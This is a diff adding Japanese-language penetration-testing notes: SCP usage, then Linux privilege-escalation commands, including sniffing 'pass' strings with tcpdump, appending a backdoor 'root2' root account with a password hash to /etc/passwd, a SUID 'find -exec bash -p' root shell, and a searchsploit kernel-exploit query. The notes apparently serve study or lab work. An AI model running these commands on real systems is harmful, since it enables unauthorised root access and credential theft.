@@ -1,5 +1,19 @@
 # Netcat
 
+# SCP
+リモートからローカルにコピーする
+```
+scp ユーザ名@リモートのホスト名:コピーしたいリモートのファイル ローカルのコピー先
+
+scp user@remoteHost:/home/user/test.txt /local/path
+```
+ローカルからリモートにコピーする
+```
+scp コピーしたいローカルのファイルパス ユーザ名@リモートのホスト名:保存したいパス
+
+scp /local/test.txt user@remoteHost:/home/user/tmp/
+```
+
 # snmpwalk
 
 使用例。最後の引数はOID(オブジェクト識別子)というもので、ターゲット上で実行されているプロセスの一覧を取得することができる。
@@ -203,3 +217,78 @@ lsmod
 -type f => タイプがファイルのものを指定    
 -perm -u=s => SUIDビットが設定されたファイルを検索  
 2>dev/null => エラーを無視
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+18. Linux上の環境変数を一覧で表示する。
+```
+env
+```
+
+19. 現在のユーザの権限を確認する。sudoersを確認し、ALLならsudo -iで昇格できる 
+```
+sudo -l
+```
+
+20. 現在実行しているすべてのプロセスを列挙し、そのプロセスに紐づくデーモンの起動スクリプト内に平文のパスワードが含まれていないかをチェックする
+```
+watch -n 1 "ps -aux | grep pass"
+```
+
+21. tcpdumpをroot権限で実行し、passの文字列が出るたびに出力する
+```
+sudo tcpdump -i lo -A | grep "pass"
+```
+
+22. cronジョブのファイルシステムをチェックして、どのユーザの権限でcronジョブが実行されたかをチェックする。root権限で実行されていて、現在のユーザが書き込み権限があればrootを取れる
+```
+grep "CRON" /var/log/syslog
+```
+
+23. /etc/passwdに書き込み権限があった場合、ファイルの中にroot2ユーザでFdzt.eqJQ4s0gというパスワードハッシュを設定する。root2にはrootのbashを許可する。
+```
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+24. SUIDを狙ってrootに権限昇格する
+```
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+```
+
+25. 現在のユーザがroot権限で実行できるコマンドを一覧表示する。
+```
+sudo -l
+```
+
+# Linux Privilege Escalation
+[GTFObin](https://gtfobins.github.io/)  
+Linuxの権限昇格で困ったら↑を参照。  
+
+1. setuidと+epが有効になっているバイナリファイルを検索する
+```
+/usr/sbin/getcap -r / 2>/dev/null
+```
+
+
+# Kernel Exploit
+
+1. Linuxのバージョン確認
+```
+cat /etc/issue
+```
+
+2. カーネルバージョンの確認
+```
+uname -r
+```
+
+3. アーキテクチャの確認
+```
+arch
+```
+
+4. kernel exploitのsearchsploitクエリ
+```
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+```
